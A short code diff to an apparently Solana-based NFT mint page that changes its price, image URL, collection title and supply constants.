@@ -4,10 +4,10 @@ import * as solanaWeb3 from "@solana/web3.js";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const solAmount = 0.69
-const image = 'https://nftsolana.io/wp-content/uploads/2022/07/CorruptedDogs.jpg' 
-const Title = 'Corrupted Dogs'
-const supply = 4444
+const solAmount = 1.25
+const image = 'https://pbs.twimg.com/profile_images/1542158660020969479/ivGb8iXM_400x400.jpg' 
+const Title = 'SMART NFT PASS'
+const supply = 2477
 
 document.title = Title
 
